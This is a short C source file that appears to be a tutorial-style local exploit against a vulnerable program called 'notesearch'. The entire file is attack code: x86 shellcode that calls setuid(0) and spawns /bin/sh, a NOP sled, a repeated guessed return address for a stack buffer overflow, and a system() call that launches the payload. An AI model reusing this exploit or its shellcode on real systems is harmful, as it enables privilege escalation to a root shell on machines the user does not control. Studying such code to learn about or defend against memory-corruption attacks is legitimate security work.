#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Linux x86 shellcode to spawn a shell (/bin/sh)
char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80"  // setuid(0) 
  "\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"  // execve("/bin//sh")
  "\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";

int main(int argc, char *argv[]) {
  unsigned int i, *ptr, ret, offset = 270;
  char *command, *buffer;

  command = (char *)malloc(200);
  if (!command) {
    perror("malloc failed");
    exit(1);
  }

  memset(command, 0, 200);  // Zero out memory
  strcpy(command, "./notesearch \'");  // Target vulnerable program
  buffer = command + strlen(command);   // Pointer to where payload starts

  // Allow user to specify offset (default: 270)
  if (argc > 1) offset = atoi(argv[1]);

  // Calculate return address (stack address guessing)
  ret = (unsigned int)&i - offset;

  // Overwrite return address repeatedly
  for (i = 0; i < 160; i += 4)
    *((unsigned int *)(buffer + i)) = ret;

  // Build NOP sled (90 = x86 NOP instruction)
  memset(buffer, 0x90, 60);

  // Append shellcode after NOP sled
  memcpy(buffer + 60, shellcode, sizeof(shellcode) - 1);

  // Close argument and execute
  strcat(command, "\'");
  system(command);

  free(command);
  return 0;
}